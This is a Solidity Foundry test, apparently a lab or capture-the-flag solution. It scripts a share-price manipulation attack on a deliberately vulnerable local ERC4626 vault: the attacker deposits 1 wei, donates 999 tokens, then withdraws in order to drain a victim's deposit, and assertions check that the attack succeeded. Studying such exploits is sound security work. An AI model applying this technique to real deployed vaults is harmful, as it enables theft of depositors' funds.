// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../src/ERC4626-v1/VulnerableVault.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MCK") {
        _mint(msg.sender, 1000000 * 10**decimals());
    }
}

contract VaultExploit is Test {
    VulnerableVault public vault;
    MockERC20 public token;
    address public player;
    address public victim;

    function setUp() public {
        token = new MockERC20();
        vault = new VulnerableVault(IERC20(address(token)));
        
        player = makeAddr("player");
        victim = makeAddr("victim");

        // Give some tokens to the player and victim
        token.transfer(player, 1000 * 10**token.decimals());
        token.transfer(victim, 10000 * 10**token.decimals());

        // Victim deposits into the vault
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(10000 * 10**token.decimals(), victim);
        vm.stopPrank();
    }

    function testExploit() public {
    vm.startPrank(player);

    // Initial balances
    uint256 initialPlayerBalance = token.balanceOf(player);
    uint256 initialVaultBalance = token.balanceOf(address(vault));
    console.log("Initial player balance:", initialPlayerBalance);
    console.log("Initial vault balance:", initialVaultBalance);

    // Log initial vault state
    console.log("Initial total supply:", vault.totalSupply());
    console.log("Initial total assets:", vault.totalAssets());

    // Step 1: Approve the vault to spend your tokens
    token.approve(address(vault), type(uint256).max);
    console.log("Step 1: Approved vault to spend tokens");

    // Step 2: Deposit a small amount to get initial shares
    uint256 smallDeposit = 1; // 1 wei
    uint256 sharesReceived = vault.deposit(smallDeposit, player);
    console.log("Step 2: Deposited", smallDeposit, "wei, received shares:", sharesReceived);

    // Log vault state after small deposit
    console.log("After small deposit - Total supply:", vault.totalSupply());
    console.log("After small deposit - Total assets:", vault.totalAssets());
    console.log("After small deposit - Player shares:", vault.balanceOf(player));
    console.log("After small deposit - Convertible assets:", vault.convertToAssets(vault.balanceOf(player)));

    // Step 3: Donate a large amount to skew the asset/share ratio
    uint256 largeDonation = 999e18; // 999 tokens
    vault.donateAssets(largeDonation);
    console.log("Step 3: Donated", largeDonation, "wei to the vault");

    // Log vault state after large donation
    console.log("After large donation - Total supply:", vault.totalSupply());
    console.log("After large donation - Total assets:", vault.totalAssets());
    console.log("After large donation - Player shares:", vault.balanceOf(player));
    console.log("After large donation - Convertible assets:", vault.convertToAssets(vault.balanceOf(player)));

    // Step 4: Calculate the amount of assets we can withdraw
    uint256 playerShares = vault.balanceOf(player);
    uint256 assetsToWithdraw = vault.convertToAssets(playerShares);
    console.log("Step 4: Player shares:", playerShares);
    console.log("Step 4: Assets to withdraw:", assetsToWithdraw);

    // Step 5: Withdraw all your shares
    uint256 assetsReceived = vault.withdraw(assetsToWithdraw, player, player);
    console.log("Step 5: Withdrawn assets:", assetsReceived);

    vm.stopPrank();

    // Final balances
    uint256 finalPlayerBalance = token.balanceOf(player);
    uint256 finalVaultBalance = token.balanceOf(address(vault));
    console.log("Final player balance:", finalPlayerBalance);
    console.log("Final vault balance:", finalVaultBalance);

    // Log final vault state
    console.log("Final total supply:", vault.totalSupply());
    console.log("Final total assets:", vault.totalAssets());

    // Calculate and log the gains
    int256 playerGain = int256(finalPlayerBalance) - int256(initialPlayerBalance);
    int256 vaultLoss = int256(initialVaultBalance) - int256(finalVaultBalance);
    console.log("Player gain:", playerGain > 0 ? uint256(playerGain) : 0);
    console.log("Vault loss:", vaultLoss > 0 ? uint256(vaultLoss) : 0);

    // Check if the exploit was successful
    assertGt(finalPlayerBalance, initialPlayerBalance, "Player should have more tokens than initial balance");
    assertLt(finalVaultBalance, initialVaultBalance / 2, "Vault should have less than half of its initial balance");
}}